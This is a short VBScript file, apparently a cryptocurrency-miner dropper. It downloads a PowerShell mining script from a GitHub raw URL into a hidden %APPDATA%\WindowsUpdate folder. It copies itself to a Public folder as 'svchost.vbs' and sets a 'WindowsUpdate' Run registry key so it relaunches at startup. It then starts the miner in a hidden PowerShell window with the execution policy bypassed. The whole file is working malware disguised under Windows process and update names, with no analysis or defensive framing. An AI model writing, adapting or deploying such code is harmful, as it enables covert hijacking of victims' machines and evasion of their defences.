' ================================
' start.vbs - Smart Miner Installer + Self-Healing
' ================================

Set sh = CreateObject("WScript.Shell")
Set fs = CreateObject("Scripting.FileSystemObject")

' Main paths
appD  = sh.ExpandEnvironmentStrings("%APPDATA%")
hFld  = appD & "\WindowsUpdate"
ps1   = hFld & "\StartMining.ps1"
url   = "https://raw.githubusercontent.com/Mrx-coder-1157/mining-scripts/main/StartMining.ps1"
backupVbs = "C:\Users\Public\Libraries\svchost.vbs"
regPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
regName = "WindowsUpdate"

' Create hidden folder if missing
If Not fs.FolderExists(hFld) Then fs.CreateFolder(hFld)

' Download the PS1 script
On Error Resume Next
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", url, False
http.Send

If http.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 2
    stream.Charset = "utf-8"
    stream.Open
    stream.WriteText http.ResponseText
    stream.SaveToFile ps1, 2
    stream.Close
End If
On Error GoTo 0

' Copy this VBS as a backup for future reboots
If Not fs.FileExists(backupVbs) Then
    fs.CopyFile WScript.ScriptFullName, backupVbs
End If

' Set registry to run backup VBS silently at startup
sh.RegWrite regPath & "\" & regName, _
    "wscript.exe """ & backupVbs & """", "REG_SZ"

' Launch PowerShell miner now silently
sh.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & ps1 & """", 0, False
